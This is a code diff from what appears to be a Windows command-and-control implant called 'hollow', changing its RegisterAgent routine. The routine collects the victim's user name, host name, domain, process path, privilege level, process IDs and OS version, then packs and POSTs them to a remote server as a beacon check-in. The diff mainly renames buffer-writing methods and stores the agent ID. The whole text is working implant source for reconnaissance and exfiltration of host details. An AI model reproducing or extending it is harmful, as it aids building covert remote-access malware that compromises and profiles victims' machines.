@@ -149,56 +149,57 @@ BOOL RegisterAgent() {
 	DWORD Userlen = 0, Hostlen = 0, Domainlen = 0, ProcPathLen = 0;
 	DWORD Major = 0, Minor = 0, Build = 0;
 
-	INT32 Agentid  = GenAgentID();
-	PBYTE User     = CollectUser(&Userlen);
-	PBYTE Host     = CollectHostname(&Hostlen);
-	PBYTE Domain   = CollectDomain(&Domainlen);
+	INT32 Agentid = GenAgentID();
+	PBYTE User = CollectUser(&Userlen);
+	PBYTE Host = CollectHostname(&Hostlen);
+	PBYTE Domain = CollectDomain(&Domainlen);
 	PBYTE ProcPath = CollectProcessPath(&ProcPathLen);
-	BOOL IsElev    = IsElevated();
-	DWORD Arch     = (sizeof(void*) != 4) ? 1 : 0;
-	DWORD Pid      = TO_DWORD(utils::win::GetTeb()->ClientId.UniqueProcess);
-	DWORD Tid      = TO_DWORD(utils::win::GetTeb()->ClientId.UniqueThread);
-	DWORD PPid     = GetPPID();
-	BOOL Ok        = FALSE;
+	BOOL IsElev = IsElevated();
+	DWORD Arch = (sizeof(void*) != 4) ? 1 : 0;
+	DWORD Pid = TO_DWORD(utils::win::GetTeb()->ClientId.UniqueProcess);
+	DWORD Tid = TO_DWORD(utils::win::GetTeb()->ClientId.UniqueThread);
+	DWORD PPid = GetPPID();
+	BOOL Ok = FALSE;
 
 	GetVersionInfo(&Major, &Minor, &Build);
 	DEBUG_LOGA("[*] Collected All Information");
 
-	if (!packager->NewWriter())
+	if (!packager->NewPacker())
 		goto CLEANUP;
 
-	if (!packager->Write4(1)) goto CLEANUP;
-	if (!packager->Write4(Agentid)) goto CLEANUP;
+	if (!packager->Pack4(1)) goto CLEANUP;
+	if (!packager->Pack4(Agentid)) goto CLEANUP;
 
-	if (!packager->Write4((INT32)Userlen)) goto CLEANUP;
-	if (Userlen && !packager->WriteBytes(User, (INT32)Userlen)) goto CLEANUP;
+	if (!packager->Pack4((INT32)Userlen)) goto CLEANUP;
+	if (Userlen && !packager->PackBytes(User, (INT32)Userlen)) goto CLEANUP;
 
-	if (!packager->Write4((INT32)Hostlen)) goto CLEANUP;
-	if (Hostlen && !packager->WriteBytes(Host, (INT32)Hostlen)) goto CLEANUP;
+	if (!packager->Pack4((INT32)Hostlen)) goto CLEANUP;
+	if (Hostlen && !packager->PackBytes(Host, (INT32)Hostlen)) goto CLEANUP;
 
-	if (!packager->Write4((INT32)Domainlen)) goto CLEANUP;
-	if (Domainlen && !packager->WriteBytes(Domain, (INT32)Domainlen)) goto CLEANUP;
+	if (!packager->Pack4((INT32)Domainlen)) goto CLEANUP;
+	if (Domainlen && !packager->PackBytes(Domain, (INT32)Domainlen)) goto CLEANUP;
 
-	if (!packager->Write4((INT32)ProcPathLen)) goto CLEANUP;
-	if (ProcPathLen && !packager->WriteBytes(ProcPath, (INT32)ProcPathLen)) goto CLEANUP;
+	if (!packager->Pack4((INT32)ProcPathLen)) goto CLEANUP;
+	if (ProcPathLen && !packager->PackBytes(ProcPath, (INT32)ProcPathLen)) goto CLEANUP;
 
-	if (!packager->Write4(IsElev)) goto CLEANUP;
-	if (!packager->Write4((INT32)Arch)) goto CLEANUP;
-	if (!packager->Write4((INT32)Pid)) goto CLEANUP;
-	if (!packager->Write4((INT32)Tid)) goto CLEANUP;
-	if (!packager->Write4((INT32)PPid)) goto CLEANUP;
-	if (!packager->Write4((INT32)Minor)) goto CLEANUP;
-	if (!packager->Write4((INT32)Major)) goto CLEANUP;
-	if (!packager->Write4((INT32)Build)) goto CLEANUP;
+	if (!packager->Pack4(IsElev)) goto CLEANUP;
+	if (!packager->Pack4((INT32)Arch)) goto CLEANUP;
+	if (!packager->Pack4((INT32)Pid)) goto CLEANUP;
+	if (!packager->Pack4((INT32)Tid)) goto CLEANUP;
+	if (!packager->Pack4((INT32)PPid)) goto CLEANUP;
+	if (!packager->Pack4((INT32)Minor)) goto CLEANUP;
+	if (!packager->Pack4((INT32)Major)) goto CLEANUP;
+	if (!packager->Pack4((INT32)Build)) goto CLEANUP;
 
-	Ok = g_NetMgr->DoPost(packager->WriterPointer(), (SIZE_T)packager->WriterSize());
+	Ok = g_NetMgr->DoPost(packager->PackerPointer(), (SIZE_T)packager->PackerSize());
+	hollow->config->AgentID = Agentid;
 
 CLEANUP:
-	if (User)     { hollow->Win32.LocalFree(User); }
-	if (Host)     { hollow->Win32.LocalFree(Host); }
-	if (Domain)   { hollow->Win32.LocalFree(Domain); }
+	if (User) { hollow->Win32.LocalFree(User); }
+	if (Host) { hollow->Win32.LocalFree(Host); }
+	if (Domain) { hollow->Win32.LocalFree(Domain); }
 	if (ProcPath) { hollow->Win32.LocalFree(ProcPath); }
-	packager->DeleteWriter();
+	packager->DeletePacker();
 
 	return Ok;
 }
